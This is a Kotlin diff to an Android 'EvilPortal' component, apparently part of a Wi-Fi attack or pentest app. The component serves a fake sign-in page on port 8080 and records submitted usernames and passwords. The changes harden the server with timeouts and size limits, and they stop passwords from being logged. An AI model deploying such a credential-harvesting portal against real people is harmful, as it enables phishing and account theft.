@@ -64,7 +64,8 @@ class EvilPortalViewModel : ViewModel() {
 
     fun initialize(context: Context) {
         this.context = context.applicationContext
-        wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
+        wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
+        if (wifiManager == null) _status.value = "Wi-Fi not available on this device."
     }
 
     @SuppressLint("MissingPermission")
@@ -126,7 +127,10 @@ class EvilPortalViewModel : ViewModel() {
                 serverSocket = ServerSocket(8080)
                 while (running) {
                     val client = try { serverSocket!!.accept() } catch (e: Exception) { break }
-                    try { handleClient(client) } catch (_: Exception) {}
+                    // Throwable : une requête malformée ne doit jamais tuer le processus.
+                    try { client.soTimeout = 5000; handleClient(client) }
+                    catch (_: Throwable) {}
+                    finally { try { client.close() } catch (_: Exception) {} }
                 }
             } catch (e: Exception) {
                 _status.value = "Server error: ${e.message}"
@@ -150,11 +154,15 @@ class EvilPortalViewModel : ViewModel() {
         val method = requestLine.substringBefore(" ")
         var contentLength = 0
         var line: String?
+        var headers = 0
         while (reader.readLine().also { line = it } != null && !line.isNullOrEmpty()) {
+            if (++headers > MAX_HEADERS) return
             if (line!!.startsWith("Content-Length:", true)) {
                 contentLength = line!!.substringAfter(":").trim().toIntOrNull() ?: 0
             }
         }
+        // Taille fournie par le client : bornée pour éviter une allocation géante (OOM).
+        contentLength = contentLength.coerceIn(0, MAX_BODY_CHARS)
         if (method.equals("POST", true) && contentLength > 0) {
             val body = CharArray(contentLength)
             var read = 0
@@ -187,7 +195,9 @@ class EvilPortalViewModel : ViewModel() {
         val pass = fields["password"] ?: fields["pass"] ?: "?"
         val entry = "user=$user  pass=$pass"
         _captured.value = _captured.value + entry
-        AppLog.log("EvilPortal", "Captured $entry")
+        // Le mot de passe n'est affiché que dans l'écran : jamais dans AppLog (logcat +
+        // export des journaux).
+        AppLog.log("EvilPortal", "Form submitted (user=$user, password redacted)")
     }
 
     private fun portalHtml(): String = when (_template.value) {
@@ -232,6 +242,11 @@ class EvilPortalViewModel : ViewModel() {
         <input name=password type=password placeholder="Password">
         <button type=submit>Sign in</button></form></div></body></html>
     """.trimIndent()
+
+    companion object {
+        private const val MAX_HEADERS = 100
+        private const val MAX_BODY_CHARS = 8 * 1024
+    }
 
     override fun onCleared() {
         super.onCleared()
